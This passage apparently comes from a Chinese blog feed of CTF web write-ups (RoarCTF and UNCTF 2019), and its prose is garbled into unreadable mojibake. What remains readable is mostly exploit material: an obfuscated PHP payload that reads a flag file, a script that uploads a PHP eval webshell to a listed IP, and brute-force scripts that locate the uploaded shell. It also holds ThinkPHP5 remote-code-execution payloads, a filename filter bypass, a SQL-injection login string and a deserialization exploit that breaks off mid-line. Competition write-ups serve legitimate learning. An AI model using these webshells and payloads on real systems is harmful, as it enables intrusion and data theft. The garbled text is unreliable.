5;)))|((((2).(0))&#123;0&#125;)&amp;((((-1).(0))&#123;0&#125;)|(((999**999).(1))&#123;1&#125;))))).(((((4).(0))&#123;0&#125;)&amp;(((-1).(0))&#123;0&#125;))|(((((8).(0))&#123;0&#125;)&amp;((((-1).(0))&#123;0&#125;)|(((999**999).(1))&#123;1&#125;)))|((((2).(0))&#123;0&#125;)&amp;((((-1).(0))&#123;0&#125;)|(((999**999).(1))&#123;1&#125;))))).((((-1).(0))&#123;0&#125;)|(((((8).(0))&#123;0&#125;)&amp;((((-1).(0))&#123;0&#125;)|(((999**999).(1))&#123;1&#125;)))|((((2).(0))&#123;0&#125;)&amp;((((-1).(0))&#123;0&#125;)|(((999**999).(1))&#123;1&#125;))))).(((((4).(0))&#123;0&#125;)&amp;(((-1).(0))&#123;0&#125;))|(((((8).(0))&#123;0&#125;)&amp;((((-1).(0))&#123;0&#125;)|(((999**999).(1))&#123;1&#125;)))|((((2).(0))&#123;0&#125;)&amp;((((-1).(0))&#123;0&#125;)|(((999**999).(1))&#123;1&#125;))))).(((((4).(0))&#123;0&#125;)&amp;(((-1).(0))&#123;0&#125;))|(((((8).(0))&#123;0&#125;)&amp;((((-1).(0))&#123;0&#125;)|(((999**999).(1))&#123;1&#125;)))|((((2).(0))&#123;0&#125;)&amp;((((-1).(0))&#123;0&#125;)|(((999**999).(1))&#123;1&#125;))))).((((-1).(0))&#123;0&#125;)|(((((8).(0))&#123;0&#125;)&amp;((((-1).(0))&#123;0&#125;)|(((999**999).(1))&#123;1&#125;)))|((((2).(0))&#123;0&#125;)&amp;((((-1).(0))&#123;0&#125;)|(((999**999).(1))&#123;1&#125;))))).(((((4).(0))&#123;0&#125;)&amp;(((-1).(0))&#123;0&#125;))|(((((8).(0))&#123;0&#125;)&amp;((((-1).(0))&#123;0&#125;)|(((999**999).(1))&#123;1&#125;)))|((((2).(0))&#123;0&#125;)&amp;((((-1).(0))&#123;0&#125;)|(((999**999).(1))&#123;1&#125;))))).(((((4).(0))&#123;0&#125;)&amp;(((-1).(0))&#123;0&#125;))|(((((8).(0))&#123;0&#125;)&amp;((((-1).(0))&#123;0&#125;)|(((999**999).(1))&#123;1&#125;)))|((((2).(0))&#123;0&#125;)&amp;((((-1).(0))&#123;0&#125;)|(((999**999).(1))&#123;1&#125;))))).((((-1).(0))&#123;0&#125;)|(((((8).(0))&#123;0&#125;)&amp;((((-1).(0))&#123;0&#125;)|(((999**999).(1))&#123;1&#125;)))|((((2).(0))&#123;0&#125;)&amp;((((-1).(0))&#123;0&#125;)|(((999**999).(1))&#123;1&#125;)))))))</span><br></pre></td></tr></table></figure>

<p>(serIALIze)(FILe(/f1agg))</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((((((2).(0))&#123;0&#125;)&#123;0&#125;)|(((0/0).(0))&#123;1&#125;)).(((((-1).(0))&#123;0&#125;)|(((0/0).(0))&#123;1&#125;))&amp;((((1).(0))&#123;0&#125;)|(((999**999).(1))&#123;2&#125;))).((((2).(0))&#123;0&#125;)|((((999**999).(1))&#123;0&#125;)&amp;(((999**999).(1))&#123;2&#125;))).(((999**999).(1))&#123;0&#125;).(((0/0).(0))&#123;1&#125;).((((999**999).(1))&#123;1&#125;)&amp;((((-1).(0))&#123;0&#125;)|(((0/0).(0))&#123;1&#125;))).(((999**999).(1))&#123;0&#125;).((((2).(0))&#123;0&#125;)|((((999**999).(1))&#123;0&#125;)&amp;(((999**999).(1))&#123;1&#125;))).(((((-1).(0))&#123;0&#125;)|(((0/0).(0))&#123;1&#125;))&amp;((((1).(0))&#123;0&#125;)|(((999**999).(1))&#123;2&#125;))))(((((999**999).(1))&#123;2&#125;).(((999**999).(1))&#123;0&#125;).((((999**999).(1))&#123;1&#125;)&amp;((((-1).(0))&#123;0&#125;)|(((0/0).(0))&#123;1&#125;))).(((((-1).(0))&#123;0&#125;)|(((0/0).(0))&#123;1&#125;))&amp;((((1).(0))&#123;0&#125;)|(((999**999).(1))&#123;2&#125;))))(((((-1).(0))&#123;0&#125;)|(((((8).(0))&#123;0&#125;)&amp;((((-1).(0))&#123;0&#125;)|(((999**999).(1))&#123;1&#125;)))|((((2).(0))&#123;0&#125;)&amp;((((-1).(0))&#123;0&#125;)|(((999**999).(1))&#123;1&#125;))))).((((999**999).(1))&#123;2&#125;)|((((4).(0))&#123;0&#125;)&amp;(((-1).(0))&#123;0&#125;))).(((1).(1))&#123;0&#125;).((((0/0).(0))&#123;1&#125;)|(((-2).(1))&#123;0&#125;)&amp;(((1).(0))&#123;0&#125;)).((((999**999).(1))&#123;2&#125;)|(((-2).(1))&#123;0&#125;)&amp;(((1).(0))&#123;0&#125;)).((((999**999).(1))&#123;2&#125;)|(((-2).(1))&#123;0&#125;)&amp;(((1).(0))&#123;0&#125;))))</span><br></pre></td></tr></table></figure>

<h2><span id="simple_upload">simple_upload</span></h2><p>å‘ç°æ˜¯Thinkphpæ¡†æ¶ï¼Œå’Œgayhubä¸‹çš„<code>Thinkphp</code>æ¡†æ¶å¯¹æ¯”ï¼Œå‘ç°<code>$upload-&gt;allowExts</code>å‚æ•°è°ƒç”¨é”™è¯¯(<code>allowExts</code>æ˜¯Thinkphp5çš„å‚æ•°ï¼Œè€ŒThinkphp3æ˜¯<code>exts</code>)ï¼Œæ‰€ä»¥æ²¡äº†æ–‡ä»¶ä¸Šä¼ é™åˆ¶<br><img src="/2019/11/15/RoarCTF-Web/2.png" alt><br>äºæ˜¯å¯ä»¥ä»»æ„ä¸Šä¼ ï¼ˆä½†æ˜¯å‰é¢çš„<code>strstr(strtolower($uploadFile[&#39;name&#39;]), &quot;.php&quot;</code>æŠŠphpæ–‡ä»¶ç»™è¿‡æ»¤äº†<br>ä¸Šä¼ expï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://149.129.104.250:1005/"</span></span><br><span class="line">payload = url + <span class="string">"/index.php/home/index/upload"</span></span><br><span class="line">file_shell1 = &#123;</span><br><span class="line">     <span class="string">"file"</span>:(<span class="string">'shell.txt'</span>,<span class="string">"&lt;?php @eval($_POST['pass']); ?&gt;"</span>)</span><br><span class="line">&#125;</span><br><span class="line">file_shell2 = &#123;</span><br><span class="line">    <span class="string">"file"</span>:(<span class="string">'shell.php'</span>,<span class="string">"&lt;?php @eval($_POST['pass']); ?&gt;"</span>)</span><br><span class="line">&#125;</span><br><span class="line">file_shell3 = &#123;</span><br><span class="line">    <span class="string">"file"</span>:(<span class="string">"dkk.txt"</span>,<span class="string">"dkkfile"</span>)</span><br><span class="line">&#125;</span><br><span class="line">req = requests.post(payload,files = file_shell1)</span><br><span class="line">print(req.content.decode(<span class="string">"utf-8"</span>))</span><br><span class="line"><span class="comment">#print(file_shell2)</span></span><br><span class="line">req = requests.post(payload,files = file_shell2)</span><br><span class="line">print(req.content.decode(<span class="string">"utf-8"</span>))</span><br><span class="line">req = requests.post(payload,files = file_shell3)</span><br><span class="line">print(req.content.decode(<span class="string">"utf-8"</span>))</span><br></pre></td></tr></table></figure>

<p>å›æ˜¾(ç¬¬äºŒæ¡æ–‡ä»¶ä¸Šä¼ å¤±è´¥</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;url&quot;:&quot;\/Public\/Uploads\/2019-11-17\/5dd01f6a43b9e.txt&quot;,&quot;success&quot;:1&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;url&quot;:&quot;\/Public\/Uploads\/2019-11-17\/5dd01f6aceed3.txt&quot;,&quot;success&quot;:1&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸¤ç§è§£æ³•ï¼š</p>
<h3><span id="thinkphp3çš„æ–‡ä»¶ä¸Šä¼ æ–‡ä»¶åè§„å¾‹">ThinkPHP3çš„æ–‡ä»¶ä¸Šä¼ æ–‡ä»¶åè§„å¾‹</span></h3><p>ä¸Šé¢çš„ä¸Šä¼ è„šæœ¬å…¶å®æ˜¯æŠŠç¬¬äºŒä¸ªæˆ‘ä»¬çš„shellæ–‡ä»¶ä¸Šä¼ åˆ°ç½‘ç«™çš„ï¼Œæˆ‘ä»¬åªè¦çŸ¥é“æˆ‘ä»¬ä¸Šä¼ shellçš„æ–‡ä»¶åå°±å¯ä»¥äº†<br>æŸ¥çœ‹Thinkphpæ‰‹å†Œ<a href="http://document.thinkphp.cn/manual_3_2.html#upload" target="_blank" rel="noopener">http://document.thinkphp.cn/manual_3_2.html#upload</a><br>å‘ç°å®ƒæ˜¯ç”¨æ—¶é—´æˆ³çš„å½¢å¼å‘½åï¼Œæˆ‘ä»¬çš„shellçš„æ–‡ä»¶åå°±åœ¨ç¬¬ä¸€å’Œç¬¬ä¸‰ä¸ªæ–‡ä»¶ä¹‹é—´ï¼Œå†™è„šæœ¬çˆ†ç ´</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment">#&#123;"url":"\/Public\/Uploads\/2019-10-12\/5da1b52bb3645.txt","success":1&#125;</span></span><br><span class="line"><span class="comment">#&#123;"url":"\/Public\/Uploads\/","success":1&#125;</span></span><br><span class="line"><span class="comment">#&#123;"url":"\/Public\/Uploads\/2019-10-12\/5da1b52bd6f0a.txt","success":1&#125;</span></span><br><span class="line"><span class="comment"># s = "1234567890abcdef"</span></span><br><span class="line"><span class="comment"># str = "12345"</span></span><br><span class="line"><span class="comment"># for i in str:</span></span><br><span class="line"><span class="comment">#     for j in s:</span></span><br><span class="line"><span class="comment">#         for k in s:</span></span><br><span class="line"><span class="comment">#             for l in s:</span></span><br><span class="line"><span class="comment">#                 for m in s:</span></span><br><span class="line"><span class="comment">#                     url = "http://8be4b11d-f5a8-45a7-bba6-92f57620dcf7.node3.buuoj.cn/Public/Uploads/2019-11-15/5dce6955%s%s%s%s%s.php"%(i,j,k,l,m)</span></span><br><span class="line"><span class="comment">#                     r = requests.get(url)</span></span><br><span class="line"><span class="comment">#                     print(url)</span></span><br><span class="line"><span class="comment">#                     if r.status_code != 404:</span></span><br><span class="line"><span class="comment">#                         print(url+"******************************")</span></span><br><span class="line"><span class="comment">#                         break</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9075079</span>,<span class="number">9508453</span>):</span><br><span class="line">    url = <span class="string">"http://deecf618-6aca-4ee4-9873-a5c982fb45a7.node3.buuoj.cn/Public/Uploads/2019-11-15/5dce8f19&#123;&#125;.php"</span>.format(str(hex(i)[<span class="number">2</span>:]))</span><br><span class="line">    print(url)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.get(url)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> r.status_code != <span class="number">404</span>:</span><br><span class="line">        print(url+<span class="string">"******************************"</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>å•çº¿ç¨‹çˆ†ç ´å¤ªæ…¢äº†ï¼Œæ¥ä¸ªå¤šçº¿ç¨‹ç‰ˆ</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å’•</span><br></pre></td></tr></table></figure>

<p>å’•å’•å’•ï¼ˆæ‹¿<a href="https://github.com/ring04h/dirfuzz" target="_blank" rel="noopener">dirfuzz</a>é­”æ”¹ä¸€ä¸‹</p>
<h3><span id="thinkphp3çš„ä¸€ä¸ªbypassåç¼€ååˆ©ç”¨ç‚¹">ThinkPHP3çš„ä¸€ä¸ªbypassåç¼€ååˆ©ç”¨ç‚¹</span></h3><p>å¦‚æœé¢˜ç›®æ›´æ”¹ä¸Šä¼ æ–‡ä»¶çš„å‘½åè§„åˆ™ï¼Œé‚£è¿™é“é¢˜æ˜¯ä¸æ˜¯å°±ä¸èƒ½ä¸‹æ‰‹äº†ï¼Œæ¥ä¸ªsaoç©æ„<br>å®¡è®¡Thinkphp3.2.5çš„ä¸Šä¼ æ–‡ä»¶æºç <code>Upload.class.php</code>çš„157è¡Œ<br><img src="/2019/11/15/RoarCTF-Web/3.png" alt><br><code>strip_tags</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">strip_tags</span><br><span class="line">(PHP 4, PHP 5, PHP 7)</span><br><span class="line">strip_tags â€” ä»å­—ç¬¦ä¸²ä¸­å»é™¤ HTML å’Œ PHP æ ‡è®°</span><br></pre></td></tr></table></figure>

<p><img src="/2019/11/15/RoarCTF-Web/4.png" alt><br>æŠŠä¸Šä¼ æ–‡ä»¶åæ”¹ä¸º<code>shell.p&lt;img&gt;hp</code><br><img src="/2019/11/15/RoarCTF-Web/5.png" alt><br>ç›´æ¥è®¿é—®<code>.php</code>æ–‡ä»¶å˜¿å˜¿</p>
<h2><span id="easy_java">easy_java</span></h2><p>é¢˜ç›®ç»™äº†ä¸ªç™»é™†æ¡†<br>adminå¼±å¯†ç ç™»é™†è¿›å»æ²¡ä»€ä¹ˆæœ‰ç”¨çš„ä¸œè¥¿<br><code>help</code>é‡Œé¢ä¸‹è½½æ–‡ä»¶æŠ¥é”™ï¼Œjavaå†™çš„web<br>å°è¯•<code>POST</code>ä¼ <code>filename=help.docx</code>æˆåŠŸä¸‹è½½ï¼Œçˆ†ç ´ä¸€ä¸‹åº·åº·æœ‰ä»€ä¹ˆæ–‡ä»¶ä¸‹è½½<br><img src="/2019/11/15/RoarCTF-Web/6.png" alt><br><img src="/2019/11/15/RoarCTF-Web/7.png" alt><br>æŸ¥çœ‹<code>/Flag</code>è·¯ç”±<br><img src="/2019/11/15/RoarCTF-Web/8.png" alt></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">WEB-INFä¸»è¦åŒ…å«ä¸€ä¸‹æ–‡ä»¶æˆ–ç›®å½•ï¼š</span><br><span class="line">    /WEB-INF/web.xmlï¼šWebåº”ç”¨ç¨‹åºé…ç½®æ–‡ä»¶ï¼Œæè¿°äº† servlet å’Œå…¶ä»–çš„åº”ç”¨ç»„ä»¶é…ç½®åŠå‘½åè§„åˆ™ã€‚</span><br><span class="line">    /WEB-INF/classes/ï¼šå«äº†ç«™ç‚¹æ‰€æœ‰ç”¨çš„ class æ–‡ä»¶ï¼ŒåŒ…æ‹¬ servlet class å’Œéservlet classï¼Œä»–ä»¬ä¸èƒ½åŒ…å«åœ¨ .jaræ–‡ä»¶ä¸­</span><br><span class="line">    /WEB-INF/lib/ï¼šå­˜æ”¾webåº”ç”¨éœ€è¦çš„å„ç§JARæ–‡ä»¶ï¼Œæ”¾ç½®ä»…åœ¨è¿™ä¸ªåº”ç”¨ä¸­è¦æ±‚ä½¿ç”¨çš„jaræ–‡ä»¶,å¦‚æ•°æ®åº“é©±åŠ¨jaræ–‡ä»¶</span><br><span class="line">    /WEB-INF/src/ï¼šæºç ç›®å½•ï¼ŒæŒ‰ç…§åŒ…åç»“æ„æ”¾ç½®å„ä¸ªjavaæ–‡ä»¶ã€‚</span><br><span class="line">    /WEB-INF/database.propertiesï¼šæ•°æ®åº“é…ç½®æ–‡ä»¶</span><br><span class="line">æ¼æ´æ£€æµ‹ä»¥åŠåˆ©ç”¨æ–¹æ³•ï¼šé€šè¿‡æ‰¾åˆ°web.xmlæ–‡ä»¶ï¼Œæ¨æ–­classæ–‡ä»¶çš„è·¯å¾„ï¼Œæœ€åç›´æ¥classæ–‡ä»¶ï¼Œåœ¨é€šè¿‡åç¼–è¯‘classæ–‡ä»¶ï¼Œå¾—åˆ°ç½‘ç«™æºç </span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬æ ¹æ®Jspçš„ç›®å½•è§„åˆ™æ‰¾åˆ°FlagControllerçš„classæ–‡ä»¶<br><code>filename=WEB-INF/classes/com/wm/ctf/FlagController.class</code></p>
<h2><span id="dist">dist</span></h2><p>golangï¼Œä¸ä¼šåœ¨å­¦</p>
<h2><span id="online-proxy">Online Proxy</span></h2><p>ä»¥ä¸ºæ˜¯ssrfæ‰“å†…ç½‘ï¼Œç»“æœæ˜¯XFFå¤„sqlæ³¨å…¥</p>
<h3><span id="å‚è€ƒé“¾æ¥">å‚è€ƒé“¾æ¥</span></h3><p><a href="https://xz.aliyun.com/t/6576#toc-6" target="_blank" rel="noopener">https://xz.aliyun.com/t/6576#toc-6</a><br><a href="https://www.yourhome.ren/index.php/sec/619.html" target="_blank" rel="noopener">https://www.yourhome.ren/index.php/sec/619.html</a><br><a href="https://github.red/roarctf-web-writeup/" target="_blank" rel="noopener">https://github.red/roarctf-web-writeup/</a><br><a href="http://www.pdsdt.lovepdsdt.com/index.php/2019/10/15/2019_roarctf-writeup-ginkgo/#0x01_easy_calc" target="_blank" rel="noopener">http://www.pdsdt.lovepdsdt.com/index.php/2019/10/15/2019_roarctf-writeup-ginkgo/#0x01_easy_calc</a><br><a href="https://paper.seebug.org/1059/#easy_calc" target="_blank" rel="noopener">https://paper.seebug.org/1059/#easy_calc</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h1><span id="roarctf_web">RoarCTF_Web</span></h1><p>[TOC]</p>
<h2><span id="easy_calc">easy_calc</span></h2><p>å›½èµ›calcçš„+++å¼ºç‰ˆï¼Œè¿˜åŠ äº†waf<br>æ”¶é›†äº†å„ä½]]>
    </summary>
    
  </entry>
  
  <entry>
    <title><![CDATA[UNCTF_Web_wp]]></title>
    <link href="/2019/11/08/UNCTF-Web-wp/"/>
    <id>/2019/11/08/UNCTF-Web-wp/</id>
    <published>2019-11-08T08:44:53.000Z</published>
    <updated>2019-11-14T06:37:38.564Z</updated>
    <content type="html"><![CDATA[<h1><span id="unctf_webå¤ç°">UNCTF_Webå¤ç°</span></h1><p>[TOC]</p>
<h2><span id="ç«æŠ€èµ›">ç«æŠ€èµ›</span></h2><h3><span id="nsb-login">NSB Login</span></h3><p>å¼±å¯†ç çˆ†ç ´<br><code>kaliæœ‰ä¸ªè‡ªå¸¦134mçš„å­—å…¸</code></p>
<h3><span id="nsb-reset-password">NSB Reset Password</span></h3><p>æ¨æµ‹ç”¨çš„<code>session</code>æ•°æ®åº“ç‰ˆï¼ˆæ‰‹åŠ¨æ»‘ç¨½<br>åœ¨è¾“å…¥è¿‡éªŒè¯ç åï¼Œ<code>session</code>çš„æŸä¸ªå‚æ•°å€¼å‘ç”Ÿæ”¹å˜ï¼Œå†å¼€ä¸ªç½‘é¡µå»æ‰¾å›<code>admin</code>çš„å¯†ç ï¼Œ<code>session</code>ä¸­çš„nameå°±å˜ä¸º<code>admin</code>ï¼Œå†å»åˆšåˆšçš„æ›´æ”¹å¯†ç å¤„è¾“å…¥æ–°å¯†ç ï¼Œç™»é™†<code>admin</code>æ‹¿åˆ°flag</p>
<h3><span id="checkln">checkln</span></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/calc <span class="built_in">require</span>(<span class="string">'fs'</span>).readFileSync(<span class="string">'../flag'</span>,<span class="string">'utf-8'</span>)</span><br><span class="line">/calc <span class="built_in">require</span>(<span class="string">'fs'</span>).readdirSync(<span class="string">'./'</span>)</span><br></pre></td></tr></table></figure>

<h3><span id="easy_pentest">easy_pentest</span></h3><p>ä¸€å¼€å§‹è®¿é—®é¶æœºä»»æ„é¡µé¢éƒ½è·³è½¬åˆ°<code>public/static/not_safe.html</code>ä¸‹<br>hint:<code>ä¿¡æ¯æ³„éœ²</code><br>çŒœæµ‹å¯èƒ½æ˜¯logæ—¥å¿—æ–‡ä»¶æ³„éœ²ï¼Œtpçš„logæ–‡ä»¶æœ‰è§„å¾‹</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line">pbar = tqdm(range(<span class="number">1</span>,<span class="number">13</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2018</span>,<span class="number">2020</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">13</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">20</span>):</span><br><span class="line">            url = <span class="string">"http://183.129.189.60:10041/runtime/log/"</span> + str(i) +str(j).zfill(<span class="number">2</span>) + <span class="string">"/"</span> + str(k).zfill(<span class="number">2</span>) + <span class="string">".log"</span></span><br><span class="line">            <span class="comment">#print(url + " ==&gt; " + str(requests.get(url).status_code))</span></span><br><span class="line">            <span class="keyword">if</span>(requests.get(url).status_code == <span class="number">200</span>):</span><br><span class="line">                print(url)</span><br><span class="line">            <span class="comment">#pbar.set_description("Processing %s"%i)</span></span><br></pre></td></tr></table></figure>

<p><img src="/2019/11/08/UNCTF-Web-wp/8.png" alt><br>å‘ç°æœ‰<code>safe_key</code>å‚æ•°<br><img src="/2019/11/08/UNCTF-Web-wp/9.png" alt><br><code>http://183.129.189.60:10041/public/?safe_key=easy_pentesnt_is_s0fun</code>è¿›å»ä¹‹åå‘ç°æ˜¯ThinkPHP5çš„ï¼Œæ‰¾æ‰¾æœ‰æ²¡æœ‰é€šç”¨rce<br><a href="https://xz.aliyun.com/t/6106" target="_blank" rel="noopener">https://xz.aliyun.com/t/6106</a><br>payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_method=__construct&amp;method=get&amp;server[]=1&amp;filter[]=scandir&amp;get[]=/home&amp;filter[]=var_dump</span><br><span class="line">_method=__construct&amp;method=get&amp;server[]=1&amp;filter[]=highlight_file&amp;get[]=/home/flag_1sh3r3.txt&amp;filter[]=var_dump</span><br></pre></td></tr></table></figure>

<h3><span id="easyxss">EasyXSS</span></h3><p><a href="https://www.zhihu.com/question/22638210" target="_blank" rel="noopener">https://www.zhihu.com/question/22638210</a><br><a href="https://medium.com/@yassergersy/xss-to-session-hijack-6039e11e6a81" target="_blank" rel="noopener">https://medium.com/@yassergersy/xss-to-session-hijack-6039e11e6a81</a><br><a href="https://xz.aliyun.com/t/2266" target="_blank" rel="noopener">https://xz.aliyun.com/t/2266</a></p>
<h3><span id="kampkæˆ˜é˜Ÿçš„è€å®¶">K&amp;Kæˆ˜é˜Ÿçš„è€å®¶</span></h3><p>æ‰“å¼€é¢˜ç›®ï¼Œç™»é™†ç•Œé¢<br><img src="/2019/11/08/UNCTF-Web-wp/1.png" alt><br>fuzzå‘ç°è¿‡æ»¤äº†<code>select,and,or,#,-ç­‰</code><br>é€šè¿‡ä¸‡èƒ½å¯†ç <code>admin||1||&#39;1</code>ç™»é™†<br>çœ‹åˆ°<code>./home.php?m=index</code>,å¯èƒ½æœ‰æ–‡ä»¶åŒ…å«<br>å‘ç°må‚æ•°è¿‡æ»¤äº†<code>php,base</code>ä½†æ˜¯å¯ä»¥å¤§å°å†™ç»•è¿‡ï¼Œä»»æ„æ–‡ä»¶è¯»å–å¾—åˆ°æºç ï¼Œä½†æ˜¯flagå¤§å°å†™ç»•ä¸è¿‡å»ï¼Œè¯»ä¸åˆ°æºç <br>ç›®å½•ç»“æ„</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">â”œâ”€â”€ debug.php</span><br><span class="line">â”œâ”€â”€ flag.php</span><br><span class="line">â”œâ”€â”€ home.php</span><br><span class="line">â”œâ”€â”€ inc</span><br><span class="line"> Â Â  â”œâ”€â”€ access.php</span><br><span class="line"> Â Â  â”œâ”€â”€ config.php</span><br><span class="line"> Â Â  â”œâ”€â”€ db.php</span><br><span class="line"> Â Â  â”œâ”€â”€ func.php</span><br><span class="line"> Â Â  â””â”€â”€ session.php</span><br></pre></td></tr></table></figure>

<p>æ‰¾åˆ°åº”ç”¨<code>flag.php</code>çš„åœ°æ–¹<br><img src="/2019/11/08/UNCTF-Web-wp/2.png" alt><br>æƒ³è¦è°ƒç”¨<code>__toString</code>é­”æœ¯æ–¹æ³• -&gt; æŠŠç±»å½“å­—ç¬¦ä¸²è¾“å‡º<br><code>debug</code>ç±»é‡Œçš„<code>debug()</code>å¯ä»¥åˆ©ç”¨çš„è¾“å‡º<br><img src="/2019/11/08/UNCTF-Web-wp/3.png" alt><br>åœ¨<code>home.php</code>æœ‰è°ƒç”¨<code>debug()</code><br><img src="/2019/11/08/UNCTF-Web-wp/4.png" alt><br>è·Ÿè¸ª<code>debug</code>æ–¹æ³•å‘ç°å‰åå†²çªï¼Œä½†æ˜¯<code>switch</code>æ˜¯å¼±ç±»å‹æ¯”è¾ƒï¼Œæ‰€ä»¥è®©<code>$this-&gt;choose = &quot;2&quot;</code>æ—¢å¯ç»•è¿‡<br><img src="/2019/11/08/UNCTF-Web-wp/5.png" alt></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cookie_encode</span><span class="params">($str)</span> </span>&#123;</span><br><span class="line">    $key = base64_encode($str);</span><br><span class="line">    $key = bin2hex($key);</span><br><span class="line">    $arr = str_split($key, <span class="number">2</span>);</span><br><span class="line">    $cipher = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">foreach</span>($arr <span class="keyword">as</span> $value) &#123;</span><br><span class="line">        $num = hexdec($value);</span><br><span class="line">        $num = $num + <span class="number">240</span>;</span><br><span class="line">        $cipher = $cipher.<span class="string">'%26'</span>.dechex($num);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $cipher;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">session</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $access_token = <span class="string">'3ecReK&amp;key'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$hack_token = <span class="string">"3ecReK&amp;key"</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">debug</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $choose = <span class="string">"2"</span>;</span><br><span class="line">    <span class="keyword">public</span> $forbidden = <span class="string">"Good Luck :|"</span>;</span><br><span class="line">    <span class="keyword">public</span> $access_token = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">public</span> $ob = <span class="keyword">NULL</span>;</span><br><span class="line">    <span class="keyword">public</span> $username = <span class="string">"debuger"</span>;</span><br><span class="line">    <span class="keyword">public</span> $id = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$class = <span class="keyword">new</span> debug;</span><br><span class="line">$class -&gt; forbidden = $class;  <span class="comment">//ä¸ºäº†è°ƒç”¨__toString</span></span><br><span class="line"><span class="keyword">echo</span> 